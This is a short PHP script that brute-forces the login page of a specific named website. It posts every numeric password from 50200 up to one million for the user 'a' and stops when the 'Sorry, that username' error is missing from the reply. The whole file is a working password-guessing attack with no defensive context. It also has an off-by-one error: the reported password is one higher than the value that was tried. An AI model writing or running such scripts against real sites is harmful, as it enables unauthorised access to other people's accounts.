<?php



$requestType = "POST";
	$uri = 'https://www.kup-cake.com/indexlist.php?p=login';

	$password = 50200;
	while($password < 1000000)
	{
	
	    
	    $inputs = array(
		"user" => "a",
		"password" => $password
	    );
	    $postFields = json_encode($inputs);

	    $ch = curl_init($uri);
	    curl_setopt_array($ch, array(
		CURLOPT_CUSTOMREQUEST => $requestType,
		CURLOPT_RETURNTRANSFER  =>1,
		CURLOPT_VERBOSE     => 0,
		CURLOPT_POSTFIELDS => $postFields,
		CURLOPT_HTTPHEADER => array(                                                                          
		'Content-Type: application/json',                                                                                
		'Content-Length: ' . strlen($postFields),

		    )  
	    ));
	    $out = curl_exec($ch);


	    $password++;

	    curl_close($ch);

	    if(strstr($out, "Sorry, that username"))
	    {
		if($password %100 == 0)
		echo "Password $password is not correct\n";
	    }
	    else
	    {
		echo "PASSWORD $password\n";
		echo $out;
		die();
	    }
	}
?>

